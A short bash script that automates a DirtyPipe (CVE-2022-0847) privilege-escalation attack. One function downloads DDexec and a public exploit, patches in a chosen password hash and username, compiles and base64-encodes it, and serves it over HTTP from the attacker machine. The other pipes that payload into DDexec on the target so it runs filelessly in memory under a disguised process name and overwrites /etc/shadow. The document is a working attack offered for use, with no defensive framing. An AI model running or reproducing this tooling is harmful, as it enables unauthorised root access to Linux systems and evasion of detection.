_ddexec_dirtypipe_exploit1_attacker_machine() {
	PORT=$1
	TARGETUSER=$2
	PASSWORDHASH=$(openssl passwd -1 -salt $TARGETUSER $TARGETUSER )
	mkdir /tmp/test 2> /dev/null
	cd /tmp/test
	wget https://raw.githubusercontent.com/arget13/DDexec/main/ddexec.sh -O ddexec.sh
	wget https://raw.githubusercontent.com/Arinerron/CVE-2022-0847-DirtyPipe-Exploit/main/exploit.c -O dpipe.c
	sed "s/$1$aaron^CIwpJwMMcozsUxAtRa85w./$PASSWORDHASH/g" dpipe.c > tmp.c && mv tmp.c dpipe.c && rm -ifr tmp.c
	sed "s/aaron/$TARGETUSER/g" dpipe.c > tmp.c && mv tmp.c dpipe.c && rm -ifr tmp.c
	gcc dpipe.c -o dpipe
	base64 -w0 dpipe > dpipe.b64
	python3 -m http.server $PORT
}

_ddexec_dirtypipe_exploit1_target_machine() {
	IP=$1
	PORT=$2
	PROCESSNAME=$3
	curl http://$IP:$PORT/dpipe.b64 | bash <(curl http://$IP:$PORT/ddexec.sh) /usr/bin/$PROCESSNAME /etc/shadow 1 o

}
